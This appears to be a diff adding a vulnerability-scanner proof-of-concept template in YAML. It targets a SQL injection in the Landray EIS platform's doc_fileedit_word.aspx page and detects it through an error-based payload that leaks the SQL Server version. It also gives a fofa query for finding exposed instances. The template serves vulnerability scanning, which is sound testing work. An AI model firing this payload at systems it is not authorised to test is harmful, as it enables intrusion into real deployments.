@@ -1,0 +1,24 @@
+id: poc-yaml-landray-eis-doc-fileedit-word-aspx-sqli
+info:
+  name: 蓝凌EIS智慧协同平台 doc_fileedit_word.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 蓝凌EIS
+  fofa: app="Landray-EIS智慧协同平台"
+requests:
+- method: GET
+  path: /dossier/doc_fileedit_word.aspx?recordid=1'%20and%201=@@version--+&edittype=1,1
+  expression: 'status_code == 500 &&
+
+    contains(body,"Microsoft SQL Server") &&
+
+    contains(body,"Windows") &&
+
+    contains(body,"nvarchar") &&
+
+    contains(body,"Copyright (c) Microsoft Corporation")
+
+    '
+variables: {}
+transport: http
